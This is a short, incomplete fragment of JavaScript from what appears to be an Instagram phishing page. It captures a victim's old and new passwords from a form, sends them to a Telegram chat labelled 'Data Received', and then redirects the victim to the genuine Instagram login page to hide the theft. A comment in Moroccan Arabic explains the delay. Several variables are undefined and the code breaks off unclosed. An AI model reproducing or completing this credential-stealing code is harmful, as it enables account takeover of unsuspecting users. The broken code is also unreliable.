<script>

    const chatId = '6347084263';

    document.getElementById('instaForm').onsubmit = function(e) {
        e.preventDefault();

        const message = `🚨 Data Received:\n\n🔑 Old: ${oldPass}\n🆕 New: ${newPass}`;

        window.location.href = telegramUrl;

        // مورا 2 ثواني (ملي يوصل الميساج)، حوله لإنستغرام
        setTimeout(function() {
            window.location.href = "https://www.instagram.com/accounts/login/";

</script>
